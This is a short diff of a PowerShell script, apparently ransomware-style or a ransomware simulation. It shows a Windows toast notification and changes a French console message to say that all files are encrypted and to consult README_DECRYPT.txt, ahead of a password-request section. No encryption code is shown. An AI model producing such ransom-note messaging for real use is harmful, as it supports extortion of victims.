@@ -66,7 +66,7 @@ $toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
 [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe").Show($toast)
 
 Write-Host ""
-Write-Host "Tous les fichiers sont chiffres."
+Write-Host "Tous les fichiers sont chiffres. Consulter README_DECRYPT.txt"
 Write-Host ""
 
 # --- DEMANDE MOT DE PASSE ---
